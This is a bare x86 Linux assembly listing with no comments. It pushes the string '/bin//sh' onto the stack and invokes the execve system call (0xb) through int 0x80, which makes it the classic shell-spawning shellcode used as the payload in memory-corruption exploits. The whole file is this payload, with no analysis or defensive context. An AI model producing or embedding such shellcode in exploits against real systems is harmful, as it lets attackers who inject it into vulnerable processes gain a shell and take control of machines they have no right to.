global _start

_start:
xor eax, eax
xor edx, edx

push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp

push edx
push ebx
mov ecx,esp

mov eax, 0xb
int 0x80
